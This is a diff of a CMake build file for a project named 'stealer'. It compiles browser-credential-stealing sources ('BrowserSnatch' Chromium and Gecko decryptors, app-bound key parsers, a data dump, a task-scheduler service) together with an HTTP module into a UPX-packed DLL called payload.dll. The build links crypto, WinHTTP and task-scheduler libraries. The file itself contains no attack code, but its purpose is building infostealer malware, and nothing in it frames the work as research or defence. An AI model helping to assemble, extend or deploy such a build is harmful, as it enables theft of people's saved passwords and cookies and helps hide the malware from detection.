@@ -1,51 +1,100 @@
 cmake_minimum_required(VERSION 3.19)
-include(FetchContent)
-
-project(stealer)
+project(stealer LANGUAGES CXX C)
 
 set(CMAKE_CXX_STANDARD 20)
-
-file(GLOB SOURCES "src/*.cpp")
-
-add_executable(stealer WIN32 ${SOURCES})
-target_precompile_headers(stealer PRIVATE src/pch.hpp)
-target_compile_definitions(stealer PRIVATE "$<$<CONFIG:DEBUG>:DEBUG>")
-target_compile_options(stealer PRIVATE /GR-)
-
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
 set(BUILD_SHARED_LIBS OFF)
 
-# ArduinoJson to save on size
-FetchContent_Declare(ArduinoJson
-  GIT_REPOSITORY https://github.com/bblanchon/ArduinoJson.git
-  GIT_TAG v7.1.0
+# ---- Local Dependencies (no FetchContent) ----
+set(DEPS_DIR "${CMAKE_CURRENT_SOURCE_DIR}/.deps")
+
+# SQLite3
+add_subdirectory("${DEPS_DIR}/sqlite3-cmake" sqlite3-cmake EXCLUDE_FROM_ALL)
+
+# pugixml
+add_subdirectory("${DEPS_DIR}/pugixml" pugixml EXCLUDE_FROM_ALL)
+
+# nlohmann/json - header-only, lives at libs/nlohmann/json.hpp
+set(NLOHMANN_INCLUDE "${CMAKE_CURRENT_SOURCE_DIR}/../libs")
+
+# ---- BrowserSnatch sources ----
+set(BS_DIR "${CMAKE_CURRENT_SOURCE_DIR}/BrowserSnatch/BrowserSnatch")
+
+set(BS_SOURCES
+    ${BS_DIR}/Helper.cpp
+    ${BS_DIR}/ChromiumDecryptor.cpp
+    ${BS_DIR}/AppBoundDecryptor.cpp
+    ${BS_DIR}/ChromiumParser.cpp
+    ${BS_DIR}/AppBoundKeyParser.cpp
+    ${BS_DIR}/DataDump.cpp
+    ${BS_DIR}/GeckoDecryptor.cpp
+    ${BS_DIR}/GeckoParser.cpp
+    ${BS_DIR}/TaskService.cpp
 )
-FetchContent_MakeAvailable(ArduinoJson)
-add_definitions(-DARDUINOJSON_ENABLE_STD_STRING=1)
-add_definitions(-DARDUINOJSON_STRING_LENGTH_SIZE=4)
 
-FetchContent_Declare(wolfssl
-  GIT_REPOSITORY https://github.com/wolfSSL/wolfssl.git
-  GIT_TAG v5.7.2-stable
+# ---- Unified stealer sources ----
+set(UNI_DIR "${CMAKE_CURRENT_SOURCE_DIR}/unified")
+
+set(UNI_SOURCES
+    ${UNI_DIR}/dllmain.cpp
+    ${UNI_DIR}/http.cpp
 )
-FetchContent_MakeAvailable(wolfssl)
 
-FetchContent_Declare(sqlite3
-  GIT_REPOSITORY https://github.com/sjinks/sqlite3-cmake.git
-  GIT_COMMIT e8d13b331eb328d46c9dc8020de70af9504e207a
+# ---- DLL Target ----
+add_library(stealer SHARED
+    ${UNI_SOURCES}
+    ${BS_SOURCES}
 )
-FetchContent_MakeAvailable(sqlite3)
 
-FetchContent_Declare(pugixml
-  GIT_REPOSITORY https://github.com/zeux/pugixml.git
-  GIT_COMMIT 30cc354fe37114ec7a0a4ed2192951690357c2ed
+target_include_directories(stealer PRIVATE
+    ${UNI_DIR}
+    ${BS_DIR}
+    ${BS_DIR}/includes
+    ${NLOHMANN_INCLUDE}
 )
-FetchContent_MakeAvailable(pugixml)
 
-target_link_libraries(stealer wolfssl ArduinoJson SQLite3 pugixml)
+# Precompiled header for unified sources only
+target_precompile_headers(stealer PRIVATE "${UNI_DIR}/pch.hpp")
+set_source_files_properties(${BS_SOURCES} PROPERTIES SKIP_PRECOMPILE_HEADERS ON)
 
-FetchContent_Declare(upx URL https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-win64.zip)
-FetchContent_MakeAvailable(upx)
-
-add_custom_command(TARGET stealer POST_BUILD
-  COMMAND ${upx_SOURCE_DIR}/upx.exe --best --lzma $<TARGET_FILE:stealer> -9q
+target_compile_definitions(stealer PRIVATE
+    "$<$<CONFIG:DEBUG>:DEBUG>"
+    _CRT_SECURE_NO_WARNINGS
+    _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
 )
+target_compile_options(stealer PRIVATE /W3 /utf-8 /GR-)
+
+# Link deps + system libs
+target_link_libraries(stealer PRIVATE
+    SQLite3
+    pugixml
+    bcrypt
+    crypt32
+    winhttp
+    ws2_32
+    shell32
+    advapi32
+    iphlpapi
+    shlwapi
+    ntdll
+    ole32
+    oleaut32
+    taskschd
+    Wtsapi32
+)
+
+target_link_options(stealer PRIVATE /OPT:REF /OPT:ICF)
+
+# Output as payload.dll
+set_target_properties(stealer PROPERTIES
+    OUTPUT_NAME "payload"
+    SUFFIX ".dll"
+)
+
+# UPX compression post-build
+set(UPX_EXE "${DEPS_DIR}/upx-4.2.4-win64/upx.exe")
+if(EXISTS "${UPX_EXE}")
+    add_custom_command(TARGET stealer POST_BUILD
+        COMMAND "${UPX_EXE}" --best --lzma "$<TARGET_FILE:stealer>" -9q
+    )
+endif()
